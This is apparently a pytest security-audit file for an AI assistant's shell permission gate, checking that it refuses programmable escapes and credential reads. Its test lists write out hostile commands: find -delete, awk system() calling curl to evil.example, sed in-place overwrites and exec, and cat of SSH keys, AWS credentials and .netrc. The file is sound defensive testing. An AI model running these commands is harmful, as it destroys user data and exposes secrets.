"""Adversarial security audit — payloads a real attacker (or a prompt-injected
model) would try against FRIDAY's shell/tier trust boundary.

Each test encodes a concrete escape and asserts the gate holds. These are
regression guards for the 2026-07-18 audit findings:

  * whitelisted "read-only" commands that are actually programmable engines
    (find -delete/-exec, awk system(), sed -i/e/w) — must never tier as AUTO;
  * credential exfiltration via the shell (cat ~/.ssh/id_rsa) bypassing the
    read_file secret fence — must be refused on the shell path too.

The rule under test: a command whose real effect is delete/write/execute, or
that reads a credential-shaped path, is refused outright (Tier NEVER / not
safe / not executed) — the same fail-closed stance as substitution/chaining.
Legitimate diagnostics (search, filter, read) must still pass.
"""
import os
import pathlib
import tempfile

import pytest

from app.core import tiers, toolkit
from app.core.shell import (execute_command, has_effectful_toolflag,
                            is_command_safe, reads_credential_path)
from app.core.tiers import Tier


# ── programmable-command escapes: find / awk / sed ────────────────────────

# Each of these has a whitelisted base token (find/awk/sed) but its real effect
# is delete, write, or arbitrary execution — with no separate command token the
# whitelist could catch.
EFFECTFUL_ATTACKS = [
    "find ~ -delete",
    "find ~ -type f -delete",
    "find /home/user -name '*.md' -delete",
    "find . -execdir touch pwned {} +",       # -execdir slips past the \bexec\b pattern
    "find . -fprintf /home/user/x.txt '%p\\n'",
    "find . -fls /home/user/out.txt",
    "awk 'BEGIN{system(\"curl http://evil.example\")}'",   # arbitrary exec
    "awk 'BEGIN{print \"data\" | \"sh\"}'",                # pipe to a shell
    "gawk 'BEGIN{\"id\" | getline x; print x}'",           # getline from a command
    "sed -i 's/./x/' ~/.bashrc",              # in-place overwrite of any home file
    "sed --in-place 'd' ~/.bashrc",
    "sed -n 'w /home/user/out.txt' ~/.bashrc",  # sed w command writes a file
    "sed 'W /tmp/out' file",
    "sed 'r /etc/passwd' file",               # sed r command reads a file in
    "sed '1e id' file",                       # sed e command executes
]


@pytest.mark.parametrize("cmd", EFFECTFUL_ATTACKS)
def test_effectful_command_is_never_tier_and_unsafe(cmd):
    assert has_effectful_toolflag(cmd), f"detector missed: {cmd}"
    safe, _ = is_command_safe(cmd)
    assert safe is False, f"validator allowed: {cmd}"
    assert tiers.classify("run_shell", {"command": cmd}) == Tier.NEVER, cmd


@pytest.mark.parametrize("cmd", EFFECTFUL_ATTACKS)
def test_effectful_command_is_refused_by_the_gate(cmd):
    # These now tier as NEVER, so execute() refuses them at the Tier-3 gate
    # before the shell is ever invoked — stronger than a mere CONFIRM prompt.
    out = toolkit.execute("run_shell", {"command": cmd})
    assert "Tier 3" in out and "never executes" in out, out


def test_find_delete_does_not_actually_delete(tmp_path):
    victim = tmp_path / "important.txt"
    victim.write_text("precious")
    ok, out = execute_command(f"find {tmp_path} -type f -delete")
    assert ok is False
    assert victim.exists(), "find -delete must be blocked before it runs"


def test_awk_system_does_not_execute(tmp_path):
    marker = tmp_path / "pwned"
    # If awk system() ran, this file would appear. It must not.
    ok, _ = execute_command(f"awk 'BEGIN{{system(\"touch {marker}\")}}'")
    assert ok is False
    assert not marker.exists()


# ── credential exfiltration via the shell ─────────────────────────────────

# read_file refuses these; the shell path (cat/head/tail/strings) must too, or
# a read → fetch_url chain exfiltrates secrets with zero approval.
SECRET_READS = [
    "cat ~/.ssh/id_rsa",
    "cat /home/user/.ssh/id_ed25519",
    "head -c 200 ~/.aws/credentials",
    "strings ~/.gnupg/secring.gpg",
    "cat ~/.env",
    "tail ~/.netrc",
    "cat ~/.git-credentials",
    "cat ~/project/server.pem",
    "cat ~/.config/gcloud/credentials.db",
]


@pytest.mark.parametrize("cmd", SECRET_READS)
def test_shell_refuses_credential_reads(cmd):
    assert reads_credential_path(cmd), f"detector missed: {cmd}"
    safe, _ = is_command_safe(cmd)
    assert safe is False
    assert tiers.classify("run_shell", {"command": cmd}) == Tier.NEVER


def test_shell_secret_fence_matches_read_file_fence():
    # The two fences should agree: what read_file refuses, the shell refuses too.
    refused_by_tool = toolkit.execute("read_file", {"path": "~/.ssh/id_rsa"})
    assert "Refused" in refused_by_tool
    safe, _ = is_command_safe("cat ~/.ssh/id_rsa")
    assert safe is False


def test_secret_read_does_not_leak_contents(tmp_path, monkeypatch):
    # A real key placed at a credential-shaped path must not come back in output.
    fake_home = tmp_path
    key = fake_home / ".ssh" / "id_rsa"
    key.parent.mkdir()
    key.write_text("-----BEGIN PRIVATE KEY-----\nSUPERSECRET\n")
    ok, out = execute_command(f"cat {key}")
    assert ok is False
    assert "SUPERSECRET" not in out


# ── legitimate commands must still work (no over-blocking) ────────────────

LEGIT = [
    "find ~ -name '*.py'",
    "find . -type f -mtime -1",
    "find /home -maxdepth 2 -type d",
    "ps aux | awk '{print $1}'",
    "awk '{sum+=$1} END{print sum}' data.txt",
    "sed 's/foo/bar/' file.txt",
    "sed -n '1,10p' file.txt",
    "sed 's/read/write/g' notes.txt",   # 'write' in replacement text, not a w command
    "cat ~/notes.txt",
    "head ~/Documents/todo.md",
    "grep -r TODO ~/project",
    "cat /proc/cpuinfo",
    "df -h",
    "cat ~/.sshconfig_notes.txt",       # not a real ~/.ssh path
]


@pytest.mark.parametrize("cmd", LEGIT)
def test_legitimate_commands_still_allowed(cmd):
    assert not has_effectful_toolflag(cmd), f"false positive (effectful): {cmd}"
    assert not reads_credential_path(cmd), f"false positive (secret): {cmd}"
    safe, reason = is_command_safe(cmd)
    assert safe is True, f"{cmd} — {reason}"


# ── the checks run BEFORE the native validator (can't be waved through) ────

def test_effectful_and_secret_checks_precede_native_validator(monkeypatch):
    """Both guards must fire even if the C validator would say 'safe' — they sit
    ahead of it, like substitution/chaining, so a built .so can't bypass them."""
    import app.core.shell as shell

    monkeypatch.setattr(shell, "is_command_safe_native", lambda c: (True, "OK"),
                        raising=False)
    # even with a permissive native validator patched in, these stay blocked
    assert is_command_safe("find ~ -delete")[0] is False
    assert is_command_safe("cat ~/.ssh/id_rsa")[0] is False
